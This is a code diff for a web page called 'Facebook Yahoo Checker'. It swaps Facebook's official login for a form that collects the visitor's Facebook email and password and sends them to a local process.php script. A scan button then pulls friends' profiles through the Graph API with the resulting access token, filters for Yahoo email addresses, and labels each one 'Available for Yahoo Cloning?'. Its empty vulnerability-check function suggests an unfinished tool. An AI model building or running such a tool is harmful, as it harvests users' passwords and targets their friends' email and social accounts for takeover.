@@ -29,47 +29,164 @@
 		.alert{
 			width: 50%;
 		}
+		div.container, div.container-two{
+			width: 50%;
+		}
+		.friendsList{
+			padding: 10px;
+			border-radius: 5px;
+			font-size: 15px;
+			background: #eee;
+			text-align: left !important;
+			height: 450px;
+			overflow-y: scroll;
+		}
 	</style>
 </head>
 <body>
 	<center>
-		<h1>Title Goes Here</h1>
+		<h1>Facebook Yahoo Checker</h1>
 	  	<div class="alert alert-success">
 	    	<strong>Success!</strong> You are now logged in successfully. Please wait.
 	  	</div>
-	  	<div class="alert alert-warning">
-	    	<strong>Error!</strong> Please allow the app in order to use this application.
-	  	</div>
 	  	<div class="alert alert-danger">
-	    	<strong>Error!</strong> Login cancelled by the user.
+	    	<strong>Error!</strong> Login error or invalid password supplied.
 	  	</div>
 		<div class="container">
-			<button type="button" class="btn btn-outline-primary waves-effect" id="facebook_login"><i class="fab fa-facebook-square"></i>&nbsp;Login with Facebook</button>
-			<input type="text" name="access_token" value="">
+		 	<!-- <form action="/action_page.php"> -->
+			  <div class="form-group">
+			    <label for="email">Email address/Phone:</label>
+			    <input type="text" class="form-control" id="email">
+			  </div>
+			  <div class="form-group">
+			    <label for="pwd">Password:</label>
+			    <input type="password" class="form-control" id="pwd">
+			  </div>
+			  <div class="form-group form-check">
+			    <label class="form-check-label" style="font-size: 10px;">
+			      <input class="form-check-input" type="checkbox"> Before clicking login, make sure you read our <a href="#">terms and conditions.</a>
+			    </label>
+			  </div>
+			  <button type="button" class="btn btn-outline-primary btn-block waves-effect" id="facebook_login"><i class="fab fa-facebook-square"></i>&nbsp;Login with Facebook</button>
+			<!-- </form> -->
+			
+			<input type="hidden" name="access_token" id="hid" value="">
+		</div>
+		<div class="container-two">
+			<div class="row">
+				<div class="col-6">Welcome, <span class="uname"></span></div>
+				<div class="col-6">Email: <span class="email"></span></div>
+			</div>
+			<div class="row">
+				<div class="col-12">
+					<button class="btn btn-block btn-primary" id="scan">Start Scanning</button>
+					<hr>
+				</div>
+			</div>
+			<div class="row">
+				<div class="col-12">
+					<div class="form-group">
+					  <div class="friendsList">
+					  	<center>
+					  		<span class="text-info">Click the button to start.</span>
+					  	</center>
+					  </div>
+					</div> 
+				</div>
+			</div>
 		</div>
 	</center>
+	<br><br><br>
 </body>
-<script async defer src="https://connect.facebook.net/en_US/sdk.js"></script>
 <script>
-  window.fbAsyncInit = function() {
-    FB.init({
-      appId            : '390782491641022',
-      autoLogAppEvents : true,
-      xfbml            : true,
-      version          : 'v4.0'
-    });
-  };
-</script>
-<script type="text/javascript">
-  $('#facebook_login').click( () => {
+	$("#facebook_login").attr("disabled", true);
+	$('.container-two').hide();
+	$('.alert').hide();
 
-  	FB.login( (response) => {
-  		console.log(response);
-  	});
+	$(".form-check-input").click(function() {
+	  $("#facebook_login").attr("disabled", !this.checked);
+	});
+	
+	$('#facebook_login').click(function() {
+		const u = $('#email').val();
+		const p = $('#pwd').val();
 
-  	$('button').prop('disabled', true);
-  	$('button').html('<span class="spinner-grow spinner-grow-sm"></span> Logging you in...');
+		$.ajax({
+			method : 'POST',
+			url : 'process.php',
+			data : {
+				u : u,
+				p : p
+			},
+			success : function(response) {
+				response = JSON.parse(response);
+				console.log(response);
+				if(response['code'] == 'ok'){
+					$('.container').hide();
+					$('.container-two').show();
+					$('.alert-success').show();
+					setTimeout(function() {
+						$('.alert-success').hide()
+					}, 2000);
+					$('.uname').html(response['uname']);
+					$('.email').html(response['email']);
+					$('#hid').val(response['access_token']);
+				}else{
+					$('.alert-danger').show();
+				}
+			}
+		});
+	})
 
-  });
+	$('#scan').click(function() {
+		var access_token = $('#hid').val();
+		$('.friendsList').html('');
+		$.getJSON('cache.json', function(result) {
+			$.each(result['data'], function(index, value) {
+				var name = value['name'];
+				$.ajax({
+					method : 'GET',
+					url : 'https://graph.facebook.com/'+ value['id'] +'?access_token=' + access_token + '',
+					success : function(res) {
+						if(checkEmailIfYahoo(res['email'])){
+							$('.friendsList').append('<span>Name: </span>' + res['name'] + '<br>');
+							$('.friendsList').append('<span>Email: </span>' + res['email']+ '<br>');
+							$('.friendsList').append('<span>Link: </span><a href="'+ res['link'] +'" target="_blank">' + res['link'] + '</a>'+ '<br>');
+							$('.friendsList').append('Available for Yahoo Cloning? : ' + checkEmailIfVuln(res['email']) + '<hr>');
+						}
+						
+					},
+					error : function(err){
+						console.log(err);
+						alert('An error occurred.');
+					}
+
+				});
+			});
+		});
+		
+	});
+	
+	function checkEmailIfYahoo(email) {
+		var response = false;
+		var em_provider = email.split('@'); //must be yahoo after the '@' sign
+		if(typeof email === 'undefined'){
+			response = false;
+		}
+
+		if(em_provider[1] == 'yahoo.com' || em_provider[1] == 'yahoo.com.ph'){
+			response = true;
+		}
+
+		return response;
+	}
+
+	function checkEmailIfVuln(email) {
+		var response = '';
+		
+
+
+		return response;
+	}
 </script>
 </html>
